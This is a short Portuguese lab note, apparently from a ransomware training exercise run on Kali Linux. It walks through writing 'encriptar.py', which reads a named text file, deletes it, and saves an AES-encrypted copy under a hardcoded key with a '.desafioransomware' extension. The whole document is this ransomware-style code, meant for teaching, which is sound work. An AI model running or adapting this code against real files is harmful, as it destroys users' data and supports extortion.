CRIAR ARQUIVO COM O CÓDIGO PARA CRIPTOGRAFAR

* As informações abaixo são para a criação do arquivo "encriptar.py"

(user-kaly@kali-vbox)-[~]
$ nano encriptar.py

import os
import pyaes

# ABRIR e LER o conteúdo do arquivo criptografado
arqv_name = "dadose.txt"
arqv = open(arqv_name, "rb")
arqv_data = arqv.read()
arqv.close() # fechar

# REMOVER o arquivo
os.remove(arqv_name)

# CRIAR chave de criptografia
key = b"reptoransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

# CRIPTOGRAFAR o arquivo
crypto_data = aes.encrypt(arqv_data)

# ESCREVER e SALVAR/SAIR o arquivo criptografado
new_arqv = arqv_name + ".desafioransomware" 
new_arqv = open(f'{new_arqv}','wb')
new_arqv.write(crypto_data)
new_arqv.close()

## SALVAR O ARQUIVO E SAIR DO NANO ##
ctrl o
crtl x
